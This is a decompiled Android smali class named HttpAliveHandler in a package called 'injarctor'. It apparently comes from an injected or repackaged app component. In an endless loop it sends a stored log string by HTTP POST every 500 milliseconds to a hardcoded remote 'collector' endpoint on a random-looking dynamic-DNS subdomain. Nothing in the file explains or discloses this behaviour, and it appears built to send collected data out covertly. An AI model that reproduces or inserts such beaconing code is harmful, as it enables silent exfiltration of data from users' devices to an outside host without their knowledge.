.class public Lcom/injarctor/HttpAliveHandler;
.super Ljava/lang/Object;
.source "HttpAliveHandler.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private log:Ljava/lang/String;

.field timer:Ljava/util/Timer;


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static AliveMsg(Ljava/lang/String;)V
    .registers 3

    new-instance v0, Lcom/injarctor/HttpConnection;

    invoke-direct {v0}, Lcom/injarctor/HttpConnection;-><init>()V

    const-string v1, "http://21i93061o2.iok.la/api/v1/collector/remote"

    invoke-virtual {v0, v1, p0}, Lcom/injarctor/HttpConnection;->HttpPostAliveMethod(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public getLog()Ljava/lang/String;
    .registers 2

    iget-object v0, p0, Lcom/injarctor/HttpAliveHandler;->log:Ljava/lang/String;

    return-object v0
.end method

.method public run()V
    .registers 5

    :goto_0
    const-wide/16 v0, 0x1f4

    :try_start_2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    iget-object v0, p0, Lcom/injarctor/HttpAliveHandler;->log:Ljava/lang/String;

    invoke-static {v0}, Lcom/injarctor/HttpAliveHandler;->AliveMsg(Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_a} :catch_b

    goto :goto_0

    :catch_b
    move-exception v0

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v2, Ljava/lang/StringBuffer;

    invoke-direct {v2}, Ljava/lang/StringBuffer;-><init>()V

    const-string v3, "http Failed! "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method

.method public setLog(Ljava/lang/String;)V
    .registers 2

    iput-object p1, p0, Lcom/injarctor/HttpAliveHandler;->log:Ljava/lang/String;

    return-void
.end method
